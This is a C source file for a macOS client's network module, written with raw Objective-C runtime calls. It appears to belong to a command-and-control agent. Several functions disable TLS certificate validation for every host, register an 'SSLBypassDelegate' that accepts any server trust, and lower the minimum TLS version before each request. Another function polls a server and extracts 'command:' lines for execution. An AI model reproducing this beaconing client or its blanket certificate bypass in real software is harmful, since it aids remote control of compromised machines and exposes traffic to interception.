#include "network.h"
#include <dispatch/dispatch.h>
#include <dlfcn.h>
#include <objc/message.h>
#include <objc/runtime.h>
#include <runtime/core.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include "client.h"

// Define OSStatus type if not already defined
#ifndef OSStatus
typedef int32_t OSStatus;
#endif

#define HTTP_TIMEOUT_SECONDS 5
#define MAX_URL_LENGTH 512
#define HTTP_STATUS_OK 200
#define HTTP_STATUS_NO_CONTENT 204
#define BLOCK_HAS_COPY_DISPOSE (1 << 25)
#define BLOCK_HAS_DESCRIPTOR (1 << 26)
#define MAX_RETRIES 3
#define RETRY_DELAY_MS 500

// Function prototypes
int simple_http_request(const char* url, const char* method, const char* body,
                        char* response, int response_size);

// Change to true to use SSL
#define USE_SSL true

// TLS Protocol Version Constants
// These values are from <Security/SecProtocolTypes.h>
#define kTLSProtocol12 ((intptr_t)12)
#define kTLSProtocol13 ((intptr_t)13)

// Objective-C type definitions - use only if not already defined
typedef long NSInteger;
typedef unsigned long NSUInteger;
// BOOL, YES, and NO are already defined in objc/objc.h - removing duplicate definitions

// For SSL validation
typedef BOOL (*TrustEvaluator)(id, SEL, id, id, BOOL*);

// Add these declarations for the debugging logging
static BOOL SSLTrustHandler(id self, SEL _cmd, id session, id challenge,
                            id completionHandler);

// Forward declarations
static Class create_ssl_bypass_delegate(void);

// Define HTTPSResponseContext at the top level before it's used
typedef struct {
  dispatch_semaphore_t semaphore;
  char* response_buffer;
  int response_buffer_size;
  int status_code;
  int error;
} HTTPSResponseContext;

// Direct SSL bypass function for NSURLRequest
static void disableSSLValidation(void) {
  DEBUG_LOG("Implementing aggressive SSL validation bypass");

  // Method 1: Try to set a property on NSURLRequest to allow invalid certificates
  Class NSURLRequestClass = objc_getClass("NSURLRequest");
  if (NSURLRequestClass) {
    // Try to set the class property that allows invalid certificates
    SEL setAllowsAnyHTTPSCertificateForHostSelector =
        sel_registerName("setAllowsAnyHTTPSCertificateForHost:host:");

    if (class_respondsToSelector(NSURLRequestClass,
                                 setAllowsAnyHTTPSCertificateForHostSelector)) {
      DEBUG_LOG("Using setAllowsAnyHTTPSCertificateForHost:host:");

      // Create wildcard host string
      id hostString = ((id(*)(id, SEL, const char*))objc_msgSend)(
          (id)objc_getClass("NSString"),
          sel_registerName("stringWithUTF8String:"), "*");

      // Call the class method
      ((void (*)(id, SEL, BOOL, id))objc_msgSend)(
          (id)NSURLRequestClass, setAllowsAnyHTTPSCertificateForHostSelector,
          YES, hostString);

      DEBUG_LOG("Set allowsAnyHTTPSCertificateForHost property");
    } else {
      DEBUG_LOG(
          "NSURLRequest does not respond to "
          "setAllowsAnyHTTPSCertificateForHost:host:");
    }
  }

  // Method 2: Try to set a property on NSURLSessionConfiguration
  Class NSURLSessionConfigurationClass =
      objc_getClass("NSURLSessionConfiguration");
  if (NSURLSessionConfigurationClass) {
    // Get default configuration
    SEL defaultConfigSel = sel_registerName("defaultSessionConfiguration");
    id sessionConfig = ((id(*)(id, SEL))objc_msgSend)(
        (id)NSURLSessionConfigurationClass, defaultConfigSel);

    if (sessionConfig) {
      DEBUG_LOG("Got default NSURLSessionConfiguration");

      // Try to set TLSMinimumSupportedProtocol to lowest value
      SEL setTLSMinSel = sel_registerName("setTLSMinimumSupportedProtocol:");
      if (class_respondsToSelector(object_getClass(sessionConfig),
                                   setTLSMinSel)) {
        ((void (*)(id, SEL, int))objc_msgSend)(sessionConfig, setTLSMinSel, 0);
        DEBUG_LOG("Set TLSMinimumSupportedProtocol to lowest value");
      }

      // Try to directly set property to allow invalid certificates
      SEL setAllowsInvalidCertsSel =
          sel_registerName("setAllowsInvalidSSLCertificates:");
      if (class_respondsToSelector(object_getClass(sessionConfig),
                                   setAllowsInvalidCertsSel)) {
        ((void (*)(id, SEL, BOOL))objc_msgSend)(sessionConfig,
                                                setAllowsInvalidCertsSel, YES);
        DEBUG_LOG("Set AllowsInvalidSSLCertificates to YES");
      }

      // Try another property name
      SEL setAllowsInvalidCertsForHostSel =
          sel_registerName("setAllowsInvalidCertificatesForHost:");
      if (class_respondsToSelector(object_getClass(sessionConfig),
                                   setAllowsInvalidCertsForHostSel)) {
        // Create wildcard host string
        id hostString = ((id(*)(id, SEL, const char*))objc_msgSend)(
            (id)objc_getClass("NSString"),
            sel_registerName("stringWithUTF8String:"), "*");

        ((void (*)(id, SEL, id))objc_msgSend)(
            sessionConfig, setAllowsInvalidCertsForHostSel, hostString);
        DEBUG_LOG("Set AllowsInvalidCertificatesForHost to wildcard");
      }
    }
  }

  // Method 3: Create delegate class for SSL validation bypass
  Class delegateClass = create_ssl_bypass_delegate();
  if (delegateClass) {
    DEBUG_LOG("Successfully created SSL bypass delegate class: %p",
              (void*)delegateClass);
  } else {
    DEBUG_LOG("Failed to create SSL bypass delegate class");
  }

  DEBUG_LOG("SSL validation bypass setup completed");
}

// Global trust handler for SSL/TLS
static BOOL SSLTrustHandler(id self, SEL _cmd, id session, id challenge,
                            id completionHandler) {
  DEBUG_LOG("SSL Trust handler called to handle certificate validation");

  // Safety checks
  if (!challenge || !completionHandler) {
    DEBUG_LOG(
        "Challenge or completion handler is NULL, aborting SSL validation");
    return NO;
  }

  // Get the protection space
  id protectionSpace = ((id(*)(id, SEL))objc_msgSend)(
      challenge, sel_registerName("protectionSpace"));

  if (!protectionSpace) {
    DEBUG_LOG("Protection space is NULL, aborting SSL validation");
    return NO;
  }

  // Get the authentication method
  id authMethod = ((id(*)(id, SEL))objc_msgSend)(
      protectionSpace, sel_registerName("authenticationMethod"));

  const char* authMethodStr = NULL;
  if (authMethod) {
    authMethodStr = ((const char* (*)(id, SEL))objc_msgSend)(
        authMethod, sel_registerName("UTF8String"));
    DEBUG_LOG("Authentication method: %s",
              authMethodStr ? authMethodStr : "unknown");
  }

  // Always accept any server trust challenge
  DEBUG_LOG("Bypassing server certificate validation completely");

  // Get the server trust
  id serverTrust = ((id(*)(id, SEL))objc_msgSend)(
      protectionSpace, sel_registerName("serverTrust"));

  if (!serverTrust) {
    DEBUG_LOG("Server trust is NULL, using default handling");
    // NSURLSessionAuthChallengePerformDefaultHandling = 0
    ((void (*)(id, NSInteger, id))objc_msgSend)(completionHandler, 0, NULL);
    return YES;
  }

  // Create credential with the server trust
  Class NSURLCredentialClass = objc_getClass("NSURLCredential");
  if (!NSURLCredentialClass) {
    DEBUG_LOG("NSURLCredential class not found, using default handling");
    ((void (*)(id, NSInteger, id))objc_msgSend)(completionHandler, 0, NULL);
    return YES;
  }

  // Try to create credential using credentialForTrust:
  SEL credForTrustSel = sel_registerName("credentialForTrust:");
  id credential = NULL;

  if (class_respondsToSelector(NSURLCredentialClass, credForTrustSel)) {
    credential = ((id(*)(id, SEL, id))objc_msgSend)(
        (id)NSURLCredentialClass, credForTrustSel, serverTrust);
  }

  // If that didn't work, try with alloc/init
  if (!credential) {
    id tempCred = ((id(*)(id, SEL))objc_msgSend)((id)NSURLCredentialClass,
                                                 sel_registerName("alloc"));
    if (tempCred) {
      credential = ((id(*)(id, SEL, id))objc_msgSend)(
          tempCred, sel_registerName("initWithTrust:"), serverTrust);
    }
  }

  if (credential) {
    DEBUG_LOG("Created credential for server trust, accepting certificate");
    // NSURLSessionAuthChallengeUseCredential = 1
    ((void (*)(id, NSInteger, id))objc_msgSend)(completionHandler, 1,
                                                credential);
    DEBUG_LOG("Completion handler called with credential");
  } else {
    DEBUG_LOG("Failed to create credential, using default handling");
    // NSURLSessionAuthChallengePerformDefaultHandling = 0
    ((void (*)(id, NSInteger, id))objc_msgSend)(completionHandler, 0, NULL);
  }

  return YES;
}

// Function to bypass SSL certificate validation using direct objc_msgSend calls
static void bypassSSL(id sessionConfig) {
  if (!sessionConfig) {
    DEBUG_LOG("Session configuration is NULL");
    return;
  }

  // Get NSString class
  Class NSStringClass = objc_getClass("NSString");

  // Get NSURLSessionSSLKey class
  Class NSURLSessionSSLKeyClass = objc_getClass("NSURLSessionSSLKey");

  // Create keys for SSL settings
  id tlsMinString = ((id(*)(id, SEL, const char*))objc_msgSend)(
      (id)NSStringClass, sel_registerName("stringWithUTF8String:"),
      "TLSMinimumSupportedProtocolVersion");

  id tlsMaxString = ((id(*)(id, SEL, const char*))objc_msgSend)(
      (id)NSStringClass, sel_registerName("stringWithUTF8String:"),
      "TLSMaximumSupportedProtocolVersion");

  id allowSelfSignedString = ((id(*)(id, SEL, const char*))objc_msgSend)(
      (id)NSStringClass, sel_registerName("stringWithUTF8String:"),
      "allowInvalidCertificates");

  // Create key objects
  id minTlsKey = ((id(*)(id, SEL, id))objc_msgSend)(
      (id)NSURLSessionSSLKeyClass, sel_registerName("keyWithString:"),
      tlsMinString);

  id maxTlsKey = ((id(*)(id, SEL, id))objc_msgSend)(
      (id)NSURLSessionSSLKeyClass, sel_registerName("keyWithString:"),
      tlsMaxString);

  // Get NSNumber class
  Class NSNumberClass = objc_getClass("NSNumber");

  // Create NSNumber with TLS version (2 = TLSv1.2)
  id tlsVersionNumber = ((id(*)(id, SEL, long))objc_msgSend)(
      (id)NSNumberClass, sel_registerName("numberWithLong:"), 2L);

  // Create NSNumber for YES value
  id yesNumber = ((id(*)(id, SEL, BOOL))objc_msgSend)(
      (id)NSNumberClass, sel_registerName("numberWithBool:"), YES);

  // Set minimum TLS version
  id streamSSLMinString = ((id(*)(id, SEL, const char*))objc_msgSend)(
      (id)NSStringClass, sel_registerName("stringWithUTF8String:"),
      "kCFStreamSSLMinimumTLSVersion");

  ((void (*)(id, SEL, id, id, id))objc_msgSend)(
      sessionConfig, sel_registerName("setSSLOption:value:forKey:"),
      streamSSLMinString, tlsVersionNumber, minTlsKey);

  // Set maximum TLS version
  id streamSSLMaxString = ((id(*)(id, SEL, const char*))objc_msgSend)(
      (id)NSStringClass, sel_registerName("stringWithUTF8String:"),
      "kCFStreamSSLMaximumTLSVersion");

  ((void (*)(id, SEL, id, id, id))objc_msgSend)(
      sessionConfig, sel_registerName("setSSLOption:value:forKey:"),
      streamSSLMaxString, tlsVersionNumber, maxTlsKey);

  // Allow self-signed certificates
  ((void (*)(id, SEL, id, id))objc_msgSend)(
      sessionConfig, sel_registerName("setValue:forKey:"), yesNumber,
      allowSelfSignedString);

  DEBUG_LOG("SSL validation bypassed");
}

// We'll use this as our delegate class
static Class URLSessionDelegateClass = NULL;

typedef struct {
  http_response_t* resp;
  dispatch_semaphore_t semaphore;
  bool completed;
  NetworkError error;
} RequestContext;

typedef struct {
  RTKContext* ctx;
  RTKInstance urlString;
  RTKInstance url;
  RTKInstance request;
  RTKInstance contentTypeKey;
  RTKInstance contentTypeValue;
  RTKInstance dataTask;
  RTKInstance completionHandler;
  dispatch_semaphore_t semaphore;
  RequestContext* reqContext;
} CleanupContext;

struct BlockDescriptor {
  unsigned long reserved;
  unsigned long size;
  void (*copy)(void* dst, void* src);
  void (*dispose)(void* src);
};

struct Block_literal {
  void* isa;
  int flags;
  int reserved;
  void (*invoke)(void*, id, id, id);
  struct BlockDescriptor* descriptor;
  RequestContext* context;
};

#ifdef DEBUG
typedef struct {
  NetworkError code;
  const char* message;
} ErrorMessage;

static const ErrorMessage error_messages[] = {
    {NETWORK_SUCCESS, "Success"},
    {NETWORK_ERROR_INVALID_ARGS, "Invalid arguments"},
    {NETWORK_ERROR_MEMORY, "Memory allocation failed"},
    {NETWORK_ERROR_URL_CREATE, "Failed to create URL"},
    {NETWORK_ERROR_REQUEST_CREATE, "Failed to create request"},
    {NETWORK_ERROR_TIMEOUT, "Request timed out"},
    {NETWORK_ERROR_SEND, "Failed to send request"},
    {NETWORK_ERROR_RESPONSE, "Invalid response"},
};

static void log_error(NetworkError error) {
  for (size_t i = 0; i < sizeof(error_messages) / sizeof(error_messages[0]);
       i++) {
    if (error_messages[i].code == error) {
      DEBUG_LOG("Network error: %s", error_messages[i].message);
      return;
    }
  }
  DEBUG_LOG("Unknown error: %d", error);
}
#else
#define log_error(e) ((void)0)
#endif

static void cleanup_resources(CleanupContext* cleanup) {
  if (!cleanup)
    return;

  if (cleanup->ctx) {
    if (cleanup->urlString)
      rtk_release(cleanup->ctx, cleanup->urlString);
    if (cleanup->url)
      rtk_release(cleanup->ctx, cleanup->url);
    if (cleanup->contentTypeKey)
      rtk_release(cleanup->ctx, cleanup->contentTypeKey);
    if (cleanup->contentTypeValue)
      rtk_release(cleanup->ctx, cleanup->contentTypeValue);
    if (cleanup->request)
      rtk_release(cleanup->ctx, cleanup->request);
    if (cleanup->dataTask)
      rtk_release(cleanup->ctx, cleanup->dataTask);
    if (cleanup->completionHandler)
      free(cleanup->completionHandler);
  }

  if (cleanup->semaphore)
    dispatch_release(cleanup->semaphore);
  if (cleanup->reqContext)
    free(cleanup->reqContext);

  memset(cleanup, 0, sizeof(*cleanup));
}

static void completion_invoke(void* block, id data, id response, id error) {
  struct Block_literal* literal = block;
  RequestContext* reqContext = literal->context;

  if (!reqContext || !reqContext->resp)
    return;

  http_response_t* resp = reqContext->resp;

  if (error) {
    DEBUG_LOG("Request error occurred");

    // Simple error logging for SSL issues
    typedef id (*msg_send_id)(id, SEL);
    typedef const char* (*msg_send_utf8)(id, SEL);

    msg_send_id msgSendId = (msg_send_id)objc_msgSend;

    SEL descSel = sel_registerName("localizedDescription");
    id descStr = msgSendId(error, descSel);

    if (descStr) {
      SEL utf8Sel = sel_registerName("UTF8String");
      msg_send_utf8 msgSendUtf8 = (msg_send_utf8)objc_msgSend;
      const char* errorStr = msgSendUtf8(descStr, utf8Sel);

      if (errorStr) {
        DEBUG_LOG("Error details: %s", errorStr);
      }
    }

    resp->status_code = 0;
    reqContext->error = NETWORK_ERROR_SEND;
  } else if (response) {
    typedef int (*msg_send_int)(id, SEL);
    msg_send_int msgSend = (msg_send_int)objc_msgSend;
    resp->status_code = msgSend(response, sel_registerName("statusCode"));

    DEBUG_LOG("Response status code: %d", resp->status_code);

    if (data) {
      typedef unsigned long (*msg_send_length)(id, SEL);
      msg_send_length lengthSend = (msg_send_length)objc_msgSend;
      unsigned long length = lengthSend(data, sel_registerName("length"));

      if (length > 0) {
        resp->data = malloc(length + 1);
        if (resp->data) {
          typedef const void* (*msg_send_bytes)(id, SEL);
          msg_send_bytes bytesSend = (msg_send_bytes)objc_msgSend;
          const void* bytes = bytesSend(data, sel_registerName("bytes"));

          memcpy(resp->data, bytes, length);
          resp->data[length] = '\0';
          resp->length = length;
          DEBUG_LOG("Response data received: %s", resp->data);
        }
      }
    }
  }

  reqContext->completed = true;
  dispatch_semaphore_signal(reqContext->semaphore);
}

static void block_dispose(void* block) {
  struct Block_literal* literal = block;
  literal->context = NULL;
}

static void block_copy(void* dst, void* src) {
  memcpy(dst, src, sizeof(struct Block_literal));
}

static RTKInstance create_completion_handler(RequestContext* reqContext) {
  static struct BlockDescriptor descriptor = {0, sizeof(struct Block_literal),
                                              block_copy, block_dispose};

  struct Block_literal* block = malloc(sizeof(struct Block_literal));
  if (!block)
    return NULL;

  block->isa = objc_getClass("NSBlock");
  block->flags = BLOCK_HAS_COPY_DISPOSE | BLOCK_HAS_DESCRIPTOR;
  block->reserved = 0;
  block->invoke = completion_invoke;
  block->descriptor = &descriptor;
  block->context = reqContext;

  return (RTKInstance)block;
}

static void add_security_headers(RTKContext* ctx, RTKInstance request) {
  static const char* security_headers[][2] = {
      {"X-Content-Type-Options", "nosniff"},
      {"X-Frame-Options", "DENY"},
      {"Strict-Transport-Security", "max-age=31536000; includeSubDomains"},
  };

  for (size_t i = 0; i < sizeof(security_headers) / sizeof(security_headers[0]);
       i++) {
    RTKInstance key = rtk_string_create(ctx, security_headers[i][0]);
    RTKInstance value = rtk_string_create(ctx, security_headers[i][1]);

    if (key && value) {
      rtk_msg_send_2obj(ctx, request, "setValue:forHTTPHeaderField:", value,
                        key);
    }

    if (key)
      rtk_release(ctx, key);
    if (value)
      rtk_release(ctx, value);
  }
}

// Function to create a delegate class for SSL validation bypass
static Class create_ssl_bypass_delegate(void) {
  static Class delegateClass = NULL;

  // Create the delegate class only once
  if (delegateClass != NULL) {
    return delegateClass;
  }

  DEBUG_LOG("Creating SSL bypass delegate class");

  // Create a new class derived from NSObject
  delegateClass =
      objc_allocateClassPair(objc_getClass("NSObject"), "SSLBypassDelegate", 0);
  if (!delegateClass) {
    DEBUG_LOG("Failed to allocate class pair for SSLBypassDelegate");
    return NULL;
  }

  // Add the NSURLSessionDelegate protocol
  if (!class_conformsToProtocol(delegateClass,
                                objc_getProtocol("NSURLSessionDelegate"))) {
    if (!objc_getProtocol("NSURLSessionDelegate")) {
      DEBUG_LOG("NSURLSessionDelegate protocol not found");
      return NULL;
    }
    class_addProtocol(delegateClass, objc_getProtocol("NSURLSessionDelegate"));
  }

  // Add the challenge handler method
  SEL challengeSel =
      sel_registerName("URLSession:didReceiveChallenge:completionHandler:");
  class_addMethod(delegateClass, challengeSel, (IMP)SSLTrustHandler, "B@:@@@");

  // Register the class
  objc_registerClassPair(delegateClass);

  DEBUG_LOG("SSL bypass delegate class created successfully");
  return delegateClass;
}

// Fix the send_http_request function
NetworkError send_http_request(ClientContext* ctx, const http_request_t* req,
                               http_response_t* resp) {
  if (!ctx || !req || !resp) {
    DEBUG_LOG("Invalid parameters to send_http_request");
    return NETWORK_ERROR_INVALID_ARGS;
  }

  // Fix the url access - construct a proper HTTPS URL
  char url_str[MAX_URL_LENGTH];
  // Use HTTPS instead of HTTP
  if (snprintf(url_str, sizeof(url_str), "https://%s:%d%s",
               ctx->config.server_host, ctx->config.server_port,
               req->url_path) >= (int)sizeof(url_str)) {
    DEBUG_LOG("URL too long for buffer");
    return NETWORK_ERROR_INVALID_ARGS;
  }

  DEBUG_LOG("Connecting to URL: %s", url_str);

  // Call our aggressive SSL bypass function first
  disableSSLValidation();

  // Check if we already have allocated response data
  if (!resp->data) {
    // Allocate buffer for response (assuming 4KB is sufficient)
    resp->data = malloc(4096);
    if (!resp->data) {
      DEBUG_LOG("Failed to allocate response buffer");
      return NETWORK_ERROR_MEMORY;
    }
    resp->length = 0;
  }

  // Calculate max size based on what's been allocated
  size_t max_size = resp->data ? 4096 : 0;  // Safe default if we allocated it

  // Use the simple_http_request function to make the actual request
  int response_code = simple_http_request(
      url_str,
      "POST",  // Assuming POST method for all requests
      (const char*)req->body, (char*)resp->data, (int)max_size);

  if (response_code <= 0) {
    DEBUG_LOG("Server returned error status: %d", response_code);
    return NETWORK_ERROR_SEND;
  }

  // Get the response length by finding the null terminator
  resp->length = strlen((char*)resp->data);

  // Set the response status code
  resp->status_code = response_code;
  DEBUG_LOG("Server returned success status: %d with %zu bytes", response_code,
            resp->length);

  return NETWORK_SUCCESS;
}

// Updated simple_http_request for more debug tracing
int simple_http_request(const char* url, const char* method, const char* body,
                        char* response, int response_size) {
  if (!url || !method || !response) {
    DEBUG_LOG("Invalid parameters to simple_http_request");
    return -1;
  }

  DEBUG_LOG("Starting simple HTTP request to URL: %s", url);

  // Call our aggressive SSL bypass function first
  disableSSLValidation();

  // Create an NSURL
  DEBUG_LOG("Creating NSURL from string: %s", url);
  id urlString = ((id(*)(id, SEL, const char*))objc_msgSend)(
      (id)objc_getClass("NSString"), sel_registerName("stringWithUTF8String:"),
      url);

  if (!urlString) {
    DEBUG_LOG("Failed to create URL string");
    return -1;
  }

  DEBUG_LOG("URL string created: %p", (void*)urlString);

  id nsurl = ((id(*)(id, SEL, id))objc_msgSend)(
      (id)objc_getClass("NSURL"), sel_registerName("URLWithString:"),
      urlString);

  if (!nsurl) {
    DEBUG_LOG("Failed to create NSURL");
    return -1;
  }

  DEBUG_LOG("NSURL created: %p", (void*)nsurl);

  // Create request
  DEBUG_LOG("Creating NSMutableURLRequest");
  id request = ((id(*)(id, SEL, id))objc_msgSend)(
      (id)objc_getClass("NSMutableURLRequest"),
      sel_registerName("requestWithURL:"), nsurl);

  if (!request) {
    DEBUG_LOG("Failed to create NSMutableURLRequest");
    return -1;
  }

  DEBUG_LOG("NSMutableURLRequest created: %p", (void*)request);

  // Set HTTP method
  DEBUG_LOG("Setting HTTP method: %s", method);
  id methodString = ((id(*)(id, SEL, const char*))objc_msgSend)(
      (id)objc_getClass("NSString"), sel_registerName("stringWithUTF8String:"),
      method);

  ((void (*)(id, SEL, id))objc_msgSend)(
      request, sel_registerName("setHTTPMethod:"), methodString);

  // Set request body if provided
  if (body && strlen(body) > 0) {
    DEBUG_LOG("Setting request body");
    id bodyData = ((id(*)(id, SEL, const void*, NSUInteger))objc_msgSend)(
        (id)objc_getClass("NSData"), sel_registerName("dataWithBytes:length:"),
        body, (NSUInteger)strlen(body));

    ((void (*)(id, SEL, id))objc_msgSend)(
        request, sel_registerName("setHTTPBody:"), bodyData);
  }

  // Set timeout
  ((void (*)(id, SEL, double))objc_msgSend)(
      request, sel_registerName("setTimeoutInterval:"), HTTP_TIMEOUT_SECONDS);

  // Create variables for response
  HTTPSResponseContext responseContext = {0};
  responseContext.response_buffer = response;
  responseContext.response_buffer_size = response_size;

  id responseObj = NULL;
  id errorObj = NULL;

  // Send the request synchronously
  DEBUG_LOG("Sending synchronous NSURLConnection request");
  SEL sendSyncSel =
      sel_registerName("sendSynchronousRequest:returningResponse:error:");

  id responseData = ((id(*)(id, SEL, id, id*, id*))objc_msgSend)(
      (id)objc_getClass("NSURLConnection"), sendSyncSel, request, &responseObj,
      &errorObj);

  // Check for errors
  if (errorObj) {
    DEBUG_LOG("Connection error occurred");

    // Get error description
    id errorDesc = ((id(*)(id, SEL))objc_msgSend)(
        errorObj, sel_registerName("localizedDescription"));

    if (errorDesc) {
      const char* errorStr = ((const char* (*)(id, SEL))objc_msgSend)(
          errorDesc, sel_registerName("UTF8String"));

      if (errorStr) {
        DEBUG_LOG("Error details: %s", errorStr);
      }
    }

    // Get error code
    NSInteger errorCode = ((NSInteger(*)(id, SEL))objc_msgSend)(
        errorObj, sel_registerName("code"));

    DEBUG_LOG("Error code: %ld", (long)errorCode);
    responseContext.error = (int)errorCode;

    return responseContext.error;
  }

  // Process response
  if (responseObj) {
    // Get response status code
    DEBUG_LOG("Processing response");
    NSInteger statusCode = ((NSInteger(*)(id, SEL))objc_msgSend)(
        responseObj, sel_registerName("statusCode"));

    DEBUG_LOG("Response status code: %ld", (long)statusCode);
    responseContext.status_code = (int)statusCode;
  } else {
    DEBUG_LOG("No response object received");
    return -1;
  }

  // Process response data
  if (responseData) {
    DEBUG_LOG("Processing response data");

    // Get data length
    NSUInteger length = ((NSUInteger(*)(id, SEL))objc_msgSend)(
        responseData, sel_registerName("length"));

    DEBUG_LOG("Response data length: %lu bytes", (unsigned long)length);

    // Get data bytes
    const void* bytes = ((const void* (*)(id, SEL))objc_msgSend)(
        responseData, sel_registerName("bytes"));

    if (bytes && response && length > 0) {
      // Copy response data to provided buffer
      size_t copySize =
          length < (size_t)response_size ? length : (size_t)response_size;
      memcpy(response, bytes, copySize);

      // Ensure null termination
      if (copySize < (size_t)response_size) {
        response[copySize] = '\0';
      } else {
        response[response_size - 1] = '\0';
      }

      DEBUG_LOG("Copied %zu bytes to response buffer", copySize);
    } else {
      DEBUG_LOG("No response data bytes available or NULL response buffer");
    }
  } else {
    DEBUG_LOG("No response data received");
  }

  return responseContext.status_code;
}

void free_http_response(http_response_t* resp) {
  if (!resp)
    return;
  if (resp->data) {
    free(resp->data);
    resp->data = NULL;
  }
  resp->length = 0;
  resp->status_code = 0;
}

char* get_command_from_response(ClientContext* ctx, const http_request_t* req) {
  http_response_t response = {0};

  NetworkError error = send_http_request(ctx, req, &response);
  if (error != NETWORK_SUCCESS) {
    DEBUG_LOG("Failed to send command poll request");
    return NULL;
  }

  if (response.status_code == HTTP_STATUS_NO_CONTENT) {
    DEBUG_LOG("No pending commands (status 204)");
    free_http_response(&response);
    return NULL;
  }

  if (response.status_code != HTTP_STATUS_OK || !response.data) {
    DEBUG_LOG("Invalid response: status=%d", response.status_code);
    free_http_response(&response);
    return NULL;
  }

  DEBUG_LOG("Parsing response: %s", response.data);

  char* command = NULL;
  char* lines = strdup(response.data);
  if (!lines) {
    free_http_response(&response);
    return NULL;
  }

  char* line = strtok(lines, "\n");
  while (line) {
    if (strncmp(line, "command: ", 9) == 0) {
      command = strdup(line + 9);
      break;
    }
    line = strtok(NULL, "\n");
  }

  free(lines);
  free_http_response(&response);

  if (command) {
    DEBUG_LOG("Found command: %s", command);
  }

  return command;
}
